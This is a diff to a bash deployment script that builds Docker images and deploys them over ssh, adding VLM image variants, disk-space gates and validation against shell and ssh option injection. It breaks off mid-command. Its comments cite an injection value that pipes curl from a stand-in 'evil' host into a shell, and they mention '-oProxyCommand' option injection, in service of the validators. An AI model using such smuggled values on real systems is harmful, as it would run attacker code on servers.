@@ -21,7 +21,15 @@
 #                                       promote staging dev (rollback path; also rolls back dev-fir — shared :dev tag).
 #   verify         <env>              GET /health and compare commit_sha to GIT_REF (default HEAD).
 #                                       Retries up to ACX_VERIFY_ATTEMPTS times for warm-up. Fails closed.
+#                                       Expected image repo prefers remote .env ACX_IMAGE_REPO (so
+#                                       standalone verify of a VLM deploy works without re-exporting
+#                                       ACX_BUILD_TARGET). After deploy/promote, ACX_VERIFY_OPTIONAL=1
+#                                       downgrades a failed verify to a warning (does not exit).
 #   status                            Snapshot /health for dev, dev-fir, staging, prod.
+#   clear-image-repo <env>            Remove ACX_IMAGE_REPO from the remote env .env so compose falls
+#                                       back to the recognition default (${OCIR}/.../acx-backend).
+#                                       Use this to roll back sticky VLM/variant repo state after a
+#                                       promote to recognition, or to undo a bad ship. Does not restart.
 #   reset          <env>              Destructive: stop unit, clear env Postgres state, restart, verify
 #                                       /ready, run post-reset bootstrap (tenant + api_key creation).
 #                                       Requires CONFIRM_REMOTE_RESET=RESET and ACX_RESET_SITE_URL.
@@ -58,7 +66,40 @@
 #                              own runtime still converges. Set 1 to explicitly allow the
 #                              edge ship + reload/recreate from any env (applying may
 #                              reload/recreate the prod-serving edge).
+#   ACX_BUILD_TARGET         optional docker build --target (e.g. runtime-vlm). Empty = last stage
+#                              (runtime). Charset-validated: ^[A-Za-z0-9_.-]+$ (empty allowed). Rejected
+#                              values never reach ssh/shell interpolation (D1). Remote build REFUSES any
+#                              target matching *vlm* (runtime-vlm, builder-vlm, …) — multi-GB torch
+#                              builds must run on a workstation/CI runner under a distinct image name,
+#                              never on the serving VM. Also selects the image repository name (RA-07):
+#                              empty/runtime → IMAGE_NAME (default acx-backend); runtime-vlm →
+#                              IMAGE_NAME-vlm. That same name is exported as ACX_IMAGE_REPO for compose.
+#   ACX_IMAGE_VARIANT        optional variant label (recognition|vlm). Folded into resolve_image_repo_name
+#                              and FAIL-CLOSED: ACX_IMAGE_VARIANT=vlm is refused unless ACX_BUILD_TARGET
+#                              matches *vlm*. Sibling lane bakes /app/.image-variant inside the image.
+#   ACX_SMOKE_TIMEOUT        positive integer seconds for Gate 2 /health budget (do_boot_smoke).
+#                              Default 24 for recognition; longer UNVALIDATED default (120s) when the
+#                              VLM target/variant is selected. Override this env var to raise the
+#                              budget; replace the default once a real arm64 VLM smoke is measured.
 #   CONFIRM                  required for prod actions: CONFIRM=PROMOTE (applies to deploy prod and promote * prod)
+#
+# Image variants / rollback (RA-07):
+#   Build targets produce distinct repository names so variants never clobber each other:
+#     empty / runtime  →  ${OCIR}/${NS}/${IMAGE_NAME}       (default acx-backend)
+#     runtime-vlm      →  ${OCIR}/${NS}/${IMAGE_NAME}-vlm   (default acx-backend-vlm)
+#   Greppable from the host alone:  docker images | grep -E 'acx-backend(-vlm)?'
+#   Identify a running container's variant (Dockerfile ENV, owned by ol01-img):
+#     docker inspect <container> --format '{{range .Config.Env}}{{println .}}{{end}}' \
+#       | grep '^ACX_IMAGE_VARIANT='
+#     # recognition → ACX_IMAGE_VARIANT=recognition ; VLM → ACX_IMAGE_VARIANT=vlm
+#   Rollback TO that variant's previous tag:
+#     recognition:  ${OCIR}/.../acx-backend:rollback-<id>  (or :staging / :latest)
+#     VLM:          ${OCIR}/.../acx-backend-vlm:rollback-<id>  (set ACX_BUILD_TARGET=runtime-vlm
+#                   so this script's IMAGE_BASE resolves to the -vlm repository)
+#   Sticky ACX_IMAGE_REPO on the VM drives compose forever once shipped. To reset back to the
+#   compose recognition default (remove the key from remote .env):
+#     $0 clear-image-repo <env>
+#     # or: make deploy-clear-image-repo ENV=<env>
 #
 # Reset-specific environment overrides (see do_reset()):
 #   ACX_RESET_SITE_URL       REQUIRED for reset. WordPress site URL the plugin will hit
@@ -82,11 +123,37 @@ GIT_REF="${GIT_REF:-HEAD}"
 PLATFORM="${ACX_DEPLOY_PLATFORM:-linux/arm64}"
 REMOTE_BUILD="${REMOTE_BUILD:-${ACX_REMOTE_BUILD:-0}}"
 REMOTE_BUILD_DIR="${ACX_REMOTE_BUILD_DIR:-/tmp/acx-build}"
+# Optional docker build --target. Empty means BuildKit's default (last stage = runtime).
+# This is the plumbing the script would pass as `docker build --target ...`; there was no
+# prior target notion in this file — introduce it only as the explicit opt-in for VLM/etc.
+# Case-normalised at ingestion (D8); Docker --target match is case-insensitive so we refuse
+# mixed-case evasion of the *vlm* remote-build guard.
+ACX_BUILD_TARGET="${ACX_BUILD_TARGET:-}"
+ACX_IMAGE_VARIANT="${ACX_IMAGE_VARIANT:-}"
+# Lower-case once at ingestion so enum + D8 + refuse_remote_vlm_build see a single form.
+ACX_BUILD_TARGET="$(printf '%s' "${ACX_BUILD_TARGET}" | tr '[:upper:]' '[:lower:]')"
+ACX_IMAGE_VARIANT="$(printf '%s' "${ACX_IMAGE_VARIANT}" | tr '[:upper:]' '[:lower:]')"
+
+# Pre-build free-space floor on the remote docker data root (GB).
+# Justification (not a round guess): torch-free recognition image is ~1.1GB today; a single
+# remote build leaves multi-GB BuildKit intermediate layers; README/OPS-1 already document
+# disk fill on the Always Free A1. Budget = ~2× image + ~4GB cache headroom + ~2GB for
+# concurrent container layers/logs ≈ 8GB. VLM multi-GB builds are refused entirely on the
+# remote path (see refuse_remote_vlm_build) rather than raising this further.
+REMOTE_BUILD_MIN_FREE_GB=8
+
+# Boot-smoke Gate 2 /health budget defaults (seconds). Recognition keeps the historical
+# 24s (12 × 2s polls) sized for the ~1.1GB torch-free image on 4-core Ampere A1.
+# VLM default is an UNMEASURED estimate — no VLM image has ever been built or booted in
+# this repo; replace with a measured figure once a real smoke run exists.
+SMOKE_TIMEOUT_DEFAULT=24
+SMOKE_TIMEOUT_VLM_DEFAULT=120
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 REPO_ROOT="$(cd "${SCRIPT_DIR}/../.." && pwd)"
 SERVICE_DIR="${REPO_ROOT}/apps/prototype-description-service"
-IMAGE_BASE="${OCIR_REGISTRY}/${OCIR_NAMESPACE}/${IMAGE_NAME}"
+# Display label only. Live ssh invocations use `-l "${OCI_USER}" -- "${OCI_HOST}"`
+# so a leading-dash identity can never be parsed as an ssh option (S2-A-12).
 SSH_TARGET="${OCI_USER}@${OCI_HOST}"
 
 GREEN=$'\033[0;32m'
@@ -97,6 +164,195 @@ RESET=$'\033[0m'
 log()  { printf '%s==>%s %s\n' "${GREEN}" "${RESET}" "$*"; }
 warn() { printf '%s!!%s %s\n'  "${YELLOW}" "${RESET}" "$*" >&2; }
 fail() { printf '%sxx%s %s\n'  "${RED}"    "${RESET}" "$*" >&2; exit 1; }
+
+# D1: refuse shell/ssh metacharacters before any remote interpolation. Quoting is not enough —
+# a value like x';curl evil|sh;' closes a single-quoted ssh fragment and runs as ubuntu on the VM.
+# Allowlist: empty OR ^[A-Za-z0-9_./-]+$ (docker target / tag / short name / remote path safe set).
+# `/` is path-safe (not a shell metacharacter) so ACX_REMOTE_BUILD_DIR can share this gate.
+assert_safe_shell_token() {
+  local name="$1" value="$2"
+  if [[ -z "${value}" ]]; then
+    return 0
+  fi
+  if [[ ! "${value}" =~ ^[A-Za-z0-9_./-]+$ ]]; then
+    fail "${name} failed charset validation (allowed: empty or [A-Za-z0-9_./-]+); refusing value that could reach a remote shell: ${value}"
+  fi
+}
+
+# S2-A-12: OCI_USER / OCI_HOST reach ssh argv. Leading '-' would be parsed as an option
+# (e.g. -oProxyCommand=…). Charset allowlist alone is not enough because '-' is admitted;
+# refuse leading dash and require a non-empty host/user.
+assert_safe_ssh_identity() {
+  local name="$1" value="$2"
+  if [[ -z "${value}" ]]; then
+    fail "${name} must not be empty"
+  fi
+  if [[ "${value}" == -* ]]; then
+    fail "${name} must not start with '-' (ssh option injection): ${value}"
+  fi
+  if [[ ! "${value}" =~ ^[A-Za-z0-9_.:-]+$ ]]; then
+    fail "${name} failed charset validation (allowed: [A-Za-z0-9_.:-]+); refusing: ${value}"
+  fi
+}
+assert_safe_ssh_identity "OCI_USER" "${OCI_USER}"
+assert_safe_ssh_identity "OCI_HOST" "${OCI_HOST}"
+
+# Full OCIR image repository path (registry/ns/name). No spaces, quotes, or shell metacharacters.
+assert_safe_image_repo() {
+  local name="$1" value="$2"
+  if [[ -z "${value}" ]]; then
+    fail "${name} must not be empty"
+  fi
+  if [[ ! "${value}" =~ ^[A-Za-z0-9_.:/-]+$ ]]; then
+    fail "${name} failed charset validation (allowed: [A-Za-z0-9_.:/-]+); refusing: ${value}"
+  fi
+}
+
+# Reset-path site URL: allow typical URL charset; refuse shell metacharacters (;`$| etc.).
+# Regex must live in a variable: `#` would start a comment if written inline in [[ ]].
+assert_safe_reset_site_url() {
+  local value="$1"
+  local re='^[A-Za-z0-9_.:/@%?=&#+-]+$'
+  if [[ -z "${value}" ]]; then
+    fail "ACX_RESET_SITE_URL must not be empty"
+  fi
+  if [[ ! "${value}" =~ $re ]]; then
+    fail "ACX_RESET_SITE_URL failed charset validation (URL charset only); refusing value that could reach a remote shell: ${value}"
+  fi
+}
+
+# Validate operator-facing tokens at ingestion (before resolve / IMAGE_BASE / any ssh).
+assert_safe_shell_token "IMAGE_NAME" "${IMAGE_NAME}"
+assert_safe_shell_token "OCIR_NAMESPACE" "${OCIR_NAMESPACE}"
+assert_safe_shell_token "OCIR_REGISTRY" "${OCIR_REGISTRY}"
+assert_safe_shell_token "ACX_BUILD_TARGET" "${ACX_BUILD_TARGET}"
+assert_safe_shell_token "ACX_IMAGE_VARIANT" "${ACX_IMAGE_VARIANT}"
+# D1: REMOTE_BUILD_DIR is interpolated into ssh remote command strings — same sink class as
+# ACX_BUILD_TARGET. Empty is refused (operator override of "" would otherwise skip the default).
+if [[ -z "${REMOTE_BUILD_DIR}" ]]; then
+  fail "ACX_REMOTE_BUILD_DIR must not be empty"
+fi
+assert_safe_shell_token "ACX_REMOTE_BUILD_DIR" "${REMOTE_BUILD_DIR}"
+
+# D8: explicit allowed-value enums (case already folded lower above). Anything else fails closed —
+# including `vlm2`, `bogus`, and previously-accepted freeform targets that could overwrite tags.
+assert_allowed_build_target() {
+  case "${ACX_BUILD_TARGET}" in
+    ""|runtime|runtime-vlm|builder|builder-vlm|runtime-base|uv) ;;
+    *)
+      fail "ACX_BUILD_TARGET must be one of: empty, runtime, runtime-vlm, builder, builder-vlm, runtime-base, uv (got: ${ACX_BUILD_TARGET})"
+      ;;
+  esac
+}
+assert_allowed_image_variant() {
+  case "${ACX_IMAGE_VARIANT}" in
+    ""|recognition|vlm) ;;
+    *)
+      fail "ACX_IMAGE_VARIANT must be one of: empty, recognition, vlm (got: ${ACX_IMAGE_VARIANT})"
+      ;;
+  esac
+}
+assert_allowed_build_target
+assert_allowed_image_variant
+
+# RA-07: derive repository name from ACX_BUILD_TARGET (+ ACX_IMAGE_VARIANT) so VLM and
+# recognition never share tags. Empty target keeps the historical IMAGE_NAME (default
+# acx-backend). runtime-vlm appends -vlm.
+# D8 (build half): ACX_IMAGE_VARIANT=vlm is FAIL-CLOSED unless ACX_BUILD_TARGET matches *vlm*.
+resolve_image_repo_name() {
+  local target="${ACX_BUILD_TARGET:-}"
+  local variant="${ACX_IMAGE_VARIANT:-}"
+  if [[ "${variant}" == "vlm" && "${target}" != *vlm* ]]; then
+    fail "ACX_IMAGE_VARIANT=vlm requires ACX_BUILD_TARGET matching *vlm* (got: ${target:-empty}); refusing fail-open variant/repo split"
+  fi
+  case "${target}" in
+    ""|runtime|runtime-base|builder|uv) printf '%s\n' "${IMAGE_NAME}" ;;
+    runtime-vlm|builder-vlm) printf '%s-vlm\n' "${IMAGE_NAME}" ;;
+    *)
+      # Enum above should make this unreachable; fail closed rather than invent a repo suffix.
+      fail "ACX_BUILD_TARGET=${target} is not mapped to an image repository (internal enum drift)"
+      ;;
+  esac
+}
+IMAGE_BASE="${OCIR_REGISTRY}/${OCIR_NAMESPACE}/$(resolve_image_repo_name)"
+# Compose image repo — same resolve_image_repo_name() result as build/push (one source of truth).
+# Shipped into the remote env .env so docker-compose.env.yml / .prod.yml pull the variant repo.
+# Operator may pre-set ACX_IMAGE_REPO only if it already matches resolve (no silent override).
+if [[ -n "${ACX_IMAGE_REPO:-}" && "${ACX_IMAGE_REPO}" != "${IMAGE_BASE}" ]]; then
+  assert_safe_image_repo "ACX_IMAGE_REPO" "${ACX_IMAGE_REPO}"
+  warn "ACX_IMAGE_REPO was pre-set (${ACX_IMAGE_REPO}); using resolve result ${IMAGE_BASE} as authority"
+fi
+ACX_IMAGE_REPO="${IMAGE_BASE}"
+assert_safe_image_repo "ACX_IMAGE_REPO" "${ACX_IMAGE_REPO}"
+export ACX_IMAGE_REPO
+
+# True when the selected target/variant is torch-bearing VLM (budget is unvalidated).
+is_vlm_smoke_budget() {
+  [[ "${ACX_BUILD_TARGET:-}" == *vlm* || "${ACX_IMAGE_VARIANT:-}" == "vlm" ]]
+}
+
+# Positive-integer validation for ACX_SMOKE_TIMEOUT (rg-008: fail fast at read time).
+# Defaults are image-aware; operator override must still be a positive integer.
+resolve_smoke_timeout() {
+  local default raw
+  if is_vlm_smoke_budget; then
+    default="${SMOKE_TIMEOUT_VLM_DEFAULT}"
+  else
+    default="${SMOKE_TIMEOUT_DEFAULT}"
+  fi
+  raw="${ACX_SMOKE_TIMEOUT:-${default}}"
+  if ! [[ "${raw}" =~ ^[1-9][0-9]*$ ]]; then
+    fail "ACX_SMOKE_TIMEOUT must be a positive integer (got: ${raw})"
+  fi
+  printf '%s\n' "${raw}"
+}
+
+# Remote-build hard refuse for ANY target that pulls the vlm extra (RA-03 / sr-001).
+# Match *vlm* not just the literal runtime-vlm — builder-vlm is the stage that runs
+# `uv sync --extra vlm` (full torch/CUDA download) and was a trivial bypass.
+# No override env — multi-GB builds must not run on the production-serving VM.
+refuse_remote_vlm_build() {
+  local target="${ACX_BUILD_TARGET:-}"
+  if [[ "${target}" == *vlm* ]]; then
+    fail "Remote build refuses ACX_BUILD_TARGET=${target} (matches *vlm*). Build and push torch-bearing VLM images from a workstation or CI runner under a distinct image name — never on the production-serving VM."
+  fi
+}
+
+# Assert the remote docker data root has enough free space for a recognition build.
+assert_remote_build_free_space() {
+  local min_gb avail_gb
+  min_gb="${REMOTE_BUILD_MIN_FREE_GB}"
+  # df -BG prints e.g. "12G"; strip the unit. DockerRootDir is the volume that fills
+  # with BuildKit cache (OPS-1), not the rsync temp dir.
+  avail_gb="$(ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" \
+    'root="$(docker info -f "{{.DockerRootDir}}" 2>/dev/null || echo /var/lib/docker)"; df -BG "$root" | awk "NR==2 {gsub(/G/,\"\",\$4); print \$4}"')"
+  if ! [[ "${avail_gb}" =~ ^[0-9]+$ ]]; then
+    fail "Could not determine free space on ${SSH_TARGET} docker data root (got: ${avail_gb})"
+  fi
+  if (( avail_gb < min_gb )); then
+    fail "Remote docker data root has ${avail_gb}GB free; need at least ${min_gb}GB before build (prune BuildKit cache or free disk on ${SSH_TARGET})"
+  fi
+  log "Remote free space OK: ${avail_gb}GB available (need ${min_gb}GB)"
+}
+
+# A-11 / S2-A-09: any path that materialises image layers on the VM (pull/promote/
+# boot-smoke) must consult the same free-space floor as remote build. VLM/torch
+# images are multi-GB; recognition pulls are smaller but still share the floor
+# when ACX_ENFORCE_DISK_ON_PULL=1. Default: enforce for VLM targets only so
+# hermetic boot-smoke tests with fake ssh are unaffected.
+assert_remote_disk_headroom_for_pull() {
+  if is_vlm_smoke_budget || [[ "${ACX_ENFORCE_DISK_ON_PULL:-0}" == "1" ]]; then
+    assert_remote_build_free_space
+  fi
+}
+
+# Bounded BuildKit cache reclaim on the remote host. Removes unused build-cache
+# entries older than 72h only — not a full wipe — so subsequent builds keep recent
+# layers while reclaiming the long-term disk fill documented in OPS-1 / README.
+remote_builder_prune() {
+  log "Pruning remote BuildKit cache older than 72h on ${SSH_TARGET}"
+  ssh -l "${OCI_USER}" -- "${OCI_HOST}" "docker builder prune --force --filter until=72h"
+}
 
 #---------------------------------------------------------------- env mapping
 env_to_tag() {
@@ -158,18 +414,18 @@ preflight_ocir_auth() {
   fi
 }
 preflight_ssh() {
-  if ! ssh -o BatchMode=yes -o ConnectTimeout=5 "${SSH_TARGET}" 'echo ok' >/dev/null 2>&1; then
+  if ! ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" 'echo ok' >/dev/null 2>&1; then
     warn "SSH to ${SSH_TARGET} failed (check ssh-add, public-IP allowlist, key path, tailnet status)."
     fail "SSH unavailable"
   fi
 }
 preflight_remote_docker() {
-  if ! ssh -o BatchMode=yes -o ConnectTimeout=5 "${SSH_TARGET}" 'docker info >/dev/null 2>&1'; then
+  if ! ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" 'docker info >/dev/null 2>&1'; then
     fail "docker not running (or user lacks docker group) on ${SSH_TARGET}"
   fi
 }
 preflight_remote_ocir_auth() {
-  if ! ssh -o BatchMode=yes -o ConnectTimeout=5 "${SSH_TARGET}" \
+  if ! ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" \
        "test -f ~/.docker/config.json && grep -q '\"${OCIR_REGISTRY}\"' ~/.docker/config.json"; then
     warn "No cached OCIR credential on ${SSH_TARGET} (~/.docker/config.json missing or unauthenticated for ${OCIR_REGISTRY})."
     warn "On the VM run: docker login ${OCIR_REGISTRY} -u '${OCIR_NAMESPACE}/<email>' (paste OCI auth token as password)"
@@ -345,16 +601,29 @@ REMOTE
 }
 
 #---------------------------------------------------------------- build
+# Optional --target flag from ACX_BUILD_TARGET (empty = last stage).
+_build_target_args() {
+  if [[ -n "${ACX_BUILD_TARGET}" ]]; then
+    assert_safe_shell_token "ACX_BUILD_TARGET" "${ACX_BUILD_TARGET}"
+    printf -- '--target %s' "${ACX_BUILD_TARGET}"
+  fi
+}
+
 do_build() {
   preflight_docker
-  local sha tag
+  local sha tag target_args
   sha="$(git -C "${REPO_ROOT}" rev-parse "${GIT_REF}")"
   tag="${1:-dev}"
-  log "Building ${IMAGE_BASE}:${tag} + :${sha:0:8} (${PLATFORM}, GIT_COMMIT_SHA=${sha:0:8})"
+  assert_safe_shell_token "image tag" "${tag}"
+  assert_safe_image_repo "IMAGE_BASE" "${IMAGE_BASE}"
+  target_args="$(_build_target_args)"
+  log "Building ${IMAGE_BASE}:${tag} + :${sha:0:8} (${PLATFORM}, GIT_COMMIT_SHA=${sha:0:8}${ACX_BUILD_TARGET:+, target=${ACX_BUILD_TARGET}})"
   cd "${SERVICE_DIR}"
+  # shellcheck disable=SC2086 # target_args is intentionally word-split (empty or "--target X")
   docker build \
     --platform "${PLATFORM}" \
     --build-arg "GIT_COMMIT_SHA=${sha}" \
+    ${target_args} \
     -t "${IMAGE_BASE}:${tag}" \
     -t "${IMAGE_BASE}:${sha}" \
     .
@@ -365,12 +634,32 @@ do_build_remote() {
   preflight_ssh
   preflight_remote_docker
   preflight_rsync
-  local sha tag
+  # RA-03: never run the multi-GB torch VLM build on the production-serving VM.
+  refuse_remote_vlm_build
+  local sha tag target_args
   sha="$(git -C "${REPO_ROOT}" rev-parse "${GIT_REF}")"
   tag="${1:-dev}"
+  assert_safe_shell_token "image tag" "${tag}"
+  assert_safe_image_repo "IMAGE_BASE" "${IMAGE_BASE}"
+  target_args="$(_build_target_args)"
+
+  # Reclaim stale BuildKit cache first so the free-space gate reflects post-prune headroom.
+  remote_builder_prune
+  assert_remote_build_free_space
 
   log "Syncing build context ${SERVICE_DIR}/ -> ${SSH_TARGET}:${REMOTE_BUILD_DIR}/"
-  ssh "${SSH_TARGET}" "mkdir -p ${REMOTE_BUILD_DIR}"
+  # D1: REMOTE_BUILD_DIR is charset-validated at ingestion; still single-quote at the sink so a
+  # future allowlist slip cannot unquote into remote argv (same blast radius as ACX_BUILD_TARGET).
+  ssh -l "${OCI_USER}" -- "${OCI_HOST}" "mkdir -p -- '${REMOTE_BUILD_DIR}'"
+  # Weight-artifact excludes must stay in lockstep with apps/prototype-description-service/.dockerignore
+  # (see test_dockerignore_weight_exclusions.py). This list does NOT read .dockerignore.
+  #
+  # WHY (rsync glob-depth rule — do NOT "fix" by adding **/):
+  #   rsync: a pattern with no `/` (except an optional trailing `/` for "directory only")
+  #   matches the basename at every depth. `models--*/` therefore excludes both a top-level
+  #   models--Qwen.../ and one ten levels down. Prefixing `**/` injects a slash and switches
+  #   the rule to full-path matching; that is the opposite of Docker .dockerignore, where
+  #   `*.bin` is root-anchored and `**/*.bin` is the recursive form. Never add `**/` here.
   rsync -az --delete \
     --exclude='.git/' \
     --exclude='__pycache__/' \
@@ -386,12 +675,22 @@ do_build_remote() {
     --exclude='logs/' \
     --exclude='node_modules/' \
     --exclude='recognition/infrastructure/face_pipeline/models/*.onnx' \
+    --exclude='*.safetensors' \
+    --exclude='*.bin' \
+    --exclude='*.pt' \
+    --exclude='*.pth' \
+    --exclude='*.gguf' \
+    --exclude='*.msgpack' \
+    --exclude='models--*/' \
     "${SERVICE_DIR}/" "${SSH_TARGET}:${REMOTE_BUILD_DIR}/"
 
-  log "Building ${IMAGE_BASE}:${tag} + :${sha:0:8} on ${SSH_TARGET} (native arm64)"
+  log "Building ${IMAGE_BASE}:${tag} + :${sha:0:8} on ${SSH_TARGET} (native arm64${ACX_BUILD_TARGET:+, target=${ACX_BUILD_TARGET}})"
   # No --platform: VM is already linux/arm64 (Ampere A1).
-  ssh "${SSH_TARGET}" "cd ${REMOTE_BUILD_DIR} && docker build \
+  # shellcheck disable=SC2086 # target_args is intentionally word-split (empty or "--target X")
+  # D1: quote REMOTE_BUILD_DIR (validated at ingestion) so it cannot re-open the ssh injection sink.
+  ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cd -- '${REMOTE_BUILD_DIR}' && docker build \
       --build-arg GIT_COMMIT_SHA=${sha} \
+      ${target_args} \
       -t ${IMAGE_BASE}:${tag} \
       -t ${IMAGE_BASE}:${sha} \
       ."
@@ -404,7 +703,7 @@ do_build_remote() {
 _push_ref() {
   local ref="$1"
   if [[ "${REMOTE_BUILD}" == "1" ]]; then
-    ssh "${SSH_TARGET}" "docker push ${ref}"
+    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "docker push ${ref}"
   else
     docker push "${ref}"
   fi
@@ -423,15 +722,22 @@ do_push_sha() {
 # passes, so a bad image never poisons the env tag in OCIR.
 do_push_tag() {
   local tag="$1"
+  assert_safe_shell_token "image tag" "${tag}"
+  assert_safe_image_repo "IMAGE_BASE" "${IMAGE_BASE}"
   log "Promoting ${IMAGE_BASE}:${tag} in OCIR"
-  _push_ref "${IMAGE_BASE}:${tag}"
+  if ! _push_ref "${IMAGE_BASE}:${tag}"; then
+    warn "push of ${IMAGE_BASE}:${tag} failed"
+    return 1
+  fi
 }
 
 # Shared pre-restart safety gate for <env> on candidate <image>: preserve a
-# rollback tag, boot-smoke the candidate (abort on failure), converge compose+
-# unit. Used by both do_deploy and do_promote so the prod path is uniform.
+# rollback tag, boot-smoke the candidate (abort on failure), ship ACX_IMAGE_REPO
+# into remote .env (before any env-tag promotion), converge compose+unit.
+# Used by both do_deploy and do_promote so the prod path is uniform.
 promote_gate() {
-  local env="$1" image="$2"
+  local env="$1" image="$2" remote_dir
+  remote_dir="$(env_to_remote_dir "$env")"
   # Rollback tag is non-blocking and must exist even when the smoke is
   # bypassed (ACX_BOOT_SMOKE=0) — it is the recovery path for exactly the
   # deploys risky enough to bypass the gate.
@@ -444,11 +750,67 @@ promote_gate() {
     warn "ACX_BOOT_SMOKE=0: skipping pre-promote boot smoke"
   fi
 
+  # D6 / S2-A-06: ship ACX_IMAGE_REPO exactly once here (before env-tag promotion)
+  # so a ship failure never leaves OCIR :latest pointing at an image whose remote
+  # .env never updated, and so converge_runtime / do_restart do not rewrite .env
+  # again (three independent mid-rewrite windows). Snapshot prior value for restore.
+  # Runs even when ACX_CONVERGE_RUNTIME=0 (image-only path).
+  ACX_PRIOR_IMAGE_REPO="$(read_remote_image_repo "$env" || true)"
+  ACX_PRIOR_IMAGE_REPO_ENV="$env"
+  if [[ "${ACX_PRIOR_IMAGE_REPO}" == "__INVALID_REPO__" ]]; then
+    fail "remote ACX_IMAGE_REPO on ${env} failed charset validation; refusing to deploy over a hostile/malformed sticky repo"
+  fi
+  ship_remote_image_repo_env "${remote_dir}"
+
   if [[ "${ACX_CONVERGE_RUNTIME:-1}" == "1" ]]; then
     converge_runtime "$env"
   else
-    warn "ACX_CONVERGE_RUNTIME=0: skipping compose+unit convergence (image-only restart)"
+    # HARM-A-06: image-only hotfix must not land on a compose/unit topology that
+    # differs from the repo (Gate 2 smokes the NEW topology; stale VM compose would
+    # not receive those mounts). Refuse ACX_CONVERGE_RUNTIME=0 when drift exists.
+    if ! runtime_in_sync "$env"; then
+      fail "ACX_CONVERGE_RUNTIME=0 refused for ${env}: deployed compose/unit drifts from repo. Re-run without ACX_CONVERGE_RUNTIME=0 to converge, or fix the VM first."
+    fi
+    warn "ACX_CONVERGE_RUNTIME=0: skipping compose+unit convergence (image-only restart; topology matches repo)"
   fi
+}
+
+# Restore sticky ACX_IMAGE_REPO after a post-ship failure (S2-A-06). Empty prior
+# means the key was absent — clear it rather than leave the newly shipped value.
+restore_prior_image_repo_env() {
+  local env="${ACX_PRIOR_IMAGE_REPO_ENV:-}" prior="${ACX_PRIOR_IMAGE_REPO:-}"
+  [[ -n "${env}" ]] || return 0
+  if [[ -z "${prior}" || "${prior}" == "__INVALID_REPO__" ]]; then
+    warn "Restoring prior ACX_IMAGE_REPO on ${env}: key was absent — clearing sticky repo"
+    clear_remote_image_repo_env "$env" || true
+    return 0
+  fi
+  warn "Restoring prior ACX_IMAGE_REPO=${prior} on ${env} after post-ship failure"
+  ACX_IMAGE_REPO="${prior}" ship_remote_image_repo_env "$(env_to_remote_dir "$env")" || true
+}
+
+# Read-only topology match (same diffs as converge_check) but returns 1 on drift
+# instead of calling fail() — usable under ACX_CONVERGE_RUNTIME=0 refuse path.
+runtime_in_sync() {
+  local env="$1" remote_dir unit rendered
+  remote_dir="$(env_to_remote_dir "$env")"
+  unit="$(env_to_unit "$env")"
+  if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cat '${remote_dir}/docker-compose.env.yml' 2>/dev/null" \
+       | diff -q - "${SERVICE_DIR}/docker-compose.env.yml" >/dev/null 2>&1; then
+    return 1
+  fi
+  if [[ "$env" == "prod" ]]; then
+    if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cat '${remote_dir}/docker-compose.admin.yml' 2>/dev/null" \
+         | diff -q - "${SERVICE_DIR}/docker-compose.admin.yml" >/dev/null 2>&1; then
+      return 1
+    fi
+  fi
+  rendered="$(render_unit "$env")"
+  if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cat '/etc/systemd/system/${unit}.service' 2>/dev/null" \
+       | diff -q - <(printf '%s\n' "$rendered") >/dev/null 2>&1; then
+    return 1
+  fi
+  return 0
 }
 
 env_to_compose_files() {
@@ -465,6 +827,54 @@ render_unit() {
   compose_files="$(env_to_compose_files "$env")"
   sed -e "s/{{ENV}}/${env}/g" -e "s|{{COMPOSE_FILES}}|${compose_files}|g" \
     "${SERVICE_DIR}/systemd/acx-env.service.template"
+}
+
+# Write ACX_IMAGE_REPO into the remote env .env so compose substitutes the same
+# repository resolve_image_repo_name() selected for build/push (variant parity).
+# D6: use sudo (secrets .env is often root-owned) and ensure a trailing newline
+# before append so we never concatenate onto the previous secret line.
+ship_remote_image_repo_env() {
+  local remote_dir="$1" env_file
+  env_file="${remote_dir}/.env"
+  assert_safe_image_repo "ACX_IMAGE_REPO" "${ACX_IMAGE_REPO}"
+  log "Shipping ACX_IMAGE_REPO=${ACX_IMAGE_REPO} into ${env_file} on ${SSH_TARGET}"
+  # Upsert the key without rewriting other secrets. Value is charset-validated OCIR path.
+  # Remote path env_file is from env_to_remote_dir (fixed allowlist); value is validated above.
+  ssh -l "${OCI_USER}" -- "${OCI_HOST}" \
+    "f='${env_file}'; v='${ACX_IMAGE_REPO}'; \
+     sudo test -e \"\$f\" || sudo touch \"\$f\"; \
+     if sudo test -s \"\$f\" && [ \"\$(sudo tail -c1 \"\$f\" | wc -l)\" -eq 0 ]; then \
+       printf '\\n' | sudo tee -a \"\$f\" >/dev/null; \
+     fi; \
+     if sudo grep -q '^ACX_IMAGE_REPO=' \"\$f\" 2>/dev/null; then \
+       sudo sed -i \"s|^ACX_IMAGE_REPO=.*|ACX_IMAGE_REPO=\${v}|\" \"\$f\"; \
+     else \
+       printf 'ACX_IMAGE_REPO=%s\\n' \"\$v\" | sudo tee -a \"\$f\" >/dev/null; \
+     fi"
+}
+
+# D9: remove sticky ACX_IMAGE_REPO from remote .env so compose falls back to the
+# recognition default (${OCIR}/.../acx-backend). Does not restart the unit —
+# operator restarts or re-deploys after clearing.
+clear_remote_image_repo_env() {
+  local env="$1" remote_dir env_file
+  remote_dir="$(env_to_remote_dir "$env")"
+  env_file="${remote_dir}/.env"
+  # S2-A-10: prod sticky-repo clear is latent (no restart) — require CONFIRM=PROMOTE.
+  if [[ "$env" == "prod" && "${CONFIRM:-}" != "PROMOTE" ]]; then
+    fail "clear-image-repo prod requires CONFIRM=PROMOTE (sticky-repo clear is latent until next unit restart). Re-run: CONFIRM=PROMOTE $0 clear-image-repo prod"
+  fi
+  preflight_ssh
+  log "Removing ACX_IMAGE_REPO from ${env_file} on ${SSH_TARGET} (compose → recognition default)"
+  ssh -l "${OCI_USER}" -- "${OCI_HOST}" \
+    "f='${env_file}'; \
